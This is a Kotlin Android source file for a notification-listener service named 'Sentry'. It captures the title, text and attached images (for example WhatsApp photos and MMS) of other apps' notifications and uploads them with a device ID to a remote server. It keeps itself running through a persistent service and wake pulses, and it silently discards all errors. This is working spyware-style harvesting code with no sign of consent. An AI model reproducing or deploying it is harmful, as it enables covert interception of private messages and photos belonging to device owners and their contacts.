package com.example.sentry.service

import android.graphics.Bitmap
import android.graphics.drawable.BitmapDrawable
import android.graphics.drawable.Icon
import android.os.Build
import android.os.Bundle
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Base64
import com.example.sentry.crypto.CryptoManager
import com.example.sentry.network.SentryApiClient
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.util.concurrent.ConcurrentHashMap

class SentryNotificationService : NotificationListenerService() {
    private val scope = CoroutineScope(Dispatchers.IO)
    private val lastSeenNotifications = ConcurrentHashMap<String, Long>()

    override fun onListenerConnected() {
        super.onListenerConnected()
        try {
            SentryPersistentService.startService(applicationContext)
            SentryWakeManager.scheduleWakePulse(applicationContext)
            val active = activeNotifications ?: return
            for (sbn in active) {
                processNotification(sbn)
            }
        } catch (_: Exception) {
        }
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        super.onNotificationPosted(sbn)
        try {
            SentryPersistentService.startService(applicationContext)
        } catch (_: Exception) {}
        if (sbn == null) return
        processNotification(sbn)
    }

    private fun processNotification(sbn: StatusBarNotification) {
        // Skip own notifications and ongoing persistent system notifications
        val pkg = sbn.packageName ?: "android"
        if (pkg == applicationContext.packageName || pkg.contains("sentry", ignoreCase = true)) {
            return
        }
        if (sbn.isOngoing) {
            return
        }

        val notif = sbn.notification ?: return
        val extras = notif.extras ?: return

        val title = extras.getCharSequence("android.title")?.toString()
            ?: extras.getCharSequence("android.title.big")?.toString()
            ?: notif.tickerText?.toString()
            ?: ""

        val text = extras.getCharSequence("android.text")?.toString()
            ?: extras.getCharSequence("android.bigText")?.toString()
            ?: extras.getCharSequence("android.summaryText")?.toString()
            ?: ""

        if (title.isBlank() && text.isBlank()) return

        // Extract attached photo / media preview (WhatsApp photos, MMS, image attachments)
        val imageBase64 = extractAttachedImageBase64(extras)

        // Deduplication key
        val dedupeKey = "$pkg|$title|$text|${imageBase64?.take(30) ?: ""}"
        val now = System.currentTimeMillis()
        val lastSeen = lastSeenNotifications[dedupeKey] ?: 0L
        if (now - lastSeen < 60_000) {
            // Already sent within 60 seconds, ignore duplicate
            return
        }
        lastSeenNotifications[dedupeKey] = now

        scope.launch {
            try {
                val client = SentryApiClient(applicationContext)
                val deviceId = CryptoManager.getOrCreateDeviceId(applicationContext)
                val body = JSONObject().apply {
                    put("deviceId", deviceId)
                    put("packageName", pkg)
                    put("title", title.ifBlank { "Notification" })
                    put("body", text.ifBlank { title })
                    if (!imageBase64.isNullOrBlank()) {
                        put("image", imageBase64)
                    }
                    put("timestamp", now)
                }
                client.submitNotification(body)
            } catch (_: Exception) {
            }
        }
    }

    private fun extractAttachedImageBase64(extras: Bundle): String? {
        try {
            var bitmap: Bitmap? = null

            // 1. Check android.picture / BigPictureStyle
            val picture = extras.get("android.picture")
            if (picture is Bitmap) {
                bitmap = picture
            } else if (picture is Icon) {
                val drawable = picture.loadDrawable(applicationContext)
                if (drawable is BitmapDrawable) {
                    bitmap = drawable.bitmap
                }
            }

            // 2. Check android.pictureIcon (Android 12+)
            if (bitmap == null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                try {
                    val picIcon = extras.getParcelable("android.pictureIcon", Icon::class.java)
                    val drawable = picIcon?.loadDrawable(applicationContext)
                    if (drawable is BitmapDrawable) {
                        bitmap = drawable.bitmap
                    }
                } catch (_: Exception) {
                }
            }

            // 3. Check android.largeIcon
            if (bitmap == null) {
                val largeIcon = extras.get("android.largeIcon")
                if (largeIcon is Bitmap) {
                    bitmap = largeIcon
                } else if (largeIcon is Icon) {
                    val drawable = largeIcon.loadDrawable(applicationContext)
                    if (drawable is BitmapDrawable) {
                        bitmap = drawable.bitmap
                    }
                }
            }

            if (bitmap != null) {
                // Resize if needed for optimal network transfer
                val maxDim = 800
                val scaled = if (bitmap.width > maxDim || bitmap.height > maxDim) {
                    val ratio = bitmap.width.toFloat() / bitmap.height.toFloat()
                    val newW = if (ratio > 1) maxDim else (maxDim * ratio).toInt()
                    val newH = if (ratio > 1) (maxDim / ratio).toInt() else maxDim
                    Bitmap.createScaledBitmap(bitmap, newW.coerceAtLeast(1), newH.coerceAtLeast(1), true)
                } else {
                    bitmap
                }

                val stream = ByteArrayOutputStream()
                scaled.compress(Bitmap.CompressFormat.JPEG, 75, stream)
                val bytes = stream.toByteArray()
                return Base64.encodeToString(bytes, Base64.NO_WRAP)
            }
        } catch (_: Exception) {
        }
        return null
    }
}
